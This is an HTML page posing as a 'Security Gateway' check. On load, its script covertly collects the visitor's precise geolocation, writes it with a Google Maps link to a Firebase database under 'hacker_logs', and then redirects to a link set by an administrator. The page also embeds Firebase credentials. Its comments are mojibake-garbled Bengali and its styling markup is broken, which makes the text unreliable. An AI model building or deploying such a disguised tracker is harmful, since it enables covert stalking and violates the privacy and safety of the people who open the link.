<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Gateway</title>
    <style>
        /* ‡¶ï‡ßç‡¶≤‡¶ø‡¶® ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶´‡ßá‡¶∏ */

        }
        
        /* ‡¶è‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶®‡¶∏‡¶π ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü */
        h2 {
            color: #333;

<body>

    <h2>Security Check...</h2>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, child, get } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        
        let finalRedirectLink = "https://www.google.com";
        let dataSent = false; 

        // ‡ßß. ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶´‡ßá‡¶ö ‡¶ï‡¶∞‡¶æ
        const dbRef = ref(db);
        get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
            if (snapshot.exists()) {
                finalRedirectLink = snapshot.val();
            }
        });

        // ‡ß®. ‡¶Æ‡ßá‡¶á‡¶® ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function processLocation(position) {
            if(dataSent) return; 
            dataSent = true;

            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            // üî• FIXED: ‡¶è‡¶ñ‡¶æ‡¶®‡ßá $ ‡¶ö‡¶ø‡¶π‡ßç‡¶® ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßá‡¶õ‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶≤‡¶ø‡¶Ç‡¶ï‡¶ü‡¶æ ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶æ‡¶∞‡ßç‡¶° ‡¶ï‡¶∞‡ßá‡¶õ‡¶ø
            // ‡¶è‡¶ñ‡¶® ‡¶≤‡¶ø‡¶Ç‡¶ï‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø Google Maps ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶ì‡¶™‡ßá‡¶® ‡¶π‡¶¨‡ßá
            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;

            set(newLogRef, {
                timestamp: new Date().toString(),
                googleMapsLink: mapsLink,
                latitude: lat,
                longitude: lng,
                accuracy: position.coords.accuracy
            }).then(() => {
                // ‡¶ï‡¶æ‡¶ú ‡¶∂‡ßá‡¶∑‡ßá ‡¶∞‡¶ø‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü
                window.location.href = finalRedirectLink;
            });
        }

        // ‡ß©. ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ï‡¶∂‡¶®
        window.onload = function() {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    processLocation,
                    function(error) {
                        console.log("Waiting for location...");
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 30000, 
                        maximumAge: 5000 // ‡ß´ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶ï‡ßç‡¶Ø‡¶æ‡¶∂ ‡¶™‡¶≤‡¶ø‡¶∏‡¶ø (Best Performance)
                    }
                );
            } else {
                // ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶®‡¶æ ‡¶ï‡¶∞‡¶≤‡ßá ‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡¶ø‡¶¨‡ßá
                window.location.href = finalRedirectLink;
            }
        };
    </script>
</body>
</html>
